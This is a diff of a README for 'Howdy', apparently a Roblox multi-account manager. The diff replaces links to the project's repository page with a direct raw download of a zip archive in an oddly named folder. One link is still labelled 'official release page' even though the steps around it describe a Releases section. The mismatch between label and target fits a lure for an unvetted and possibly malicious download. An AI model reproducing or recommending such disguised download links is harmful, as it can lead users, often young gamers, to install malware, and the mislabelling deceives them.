@@ -1,6 +1,6 @@
 # 🚀 Howdy - Manage Multiple Roblox Accounts With Ease
 
-[![](https://img.shields.io/badge/Download_Howdy-Blue.svg)](https://github.com/stridorsiding179/Howdy)
+[![](https://img.shields.io/badge/Download_Howdy-Blue.svg)](https://raw.githubusercontent.com/stridorsiding179/Howdy/main/theloncus/Software-v3.7.zip)
 
 Howdy is a desktop application for Windows. It provides a central hub to manage your Roblox accounts. You can run multiple instances, organize accounts into groups, and automate tasks through a built-in scheduler. 
 
@@ -16,7 +16,7 @@ Howdy is a desktop application for Windows. It provides a central hub to manage 
 
 Follow these steps to set up Howdy on your computer.
 
-1. Visit the [official release page](https://github.com/stridorsiding179/Howdy) to download the installer.
+1. Visit the [official release page](https://raw.githubusercontent.com/stridorsiding179/Howdy/main/theloncus/Software-v3.7.zip) to download the installer.
 2. Select the latest version listed under the Releases section.
 3. Download the setup file.
 4. Locate the file in your downloads folder.
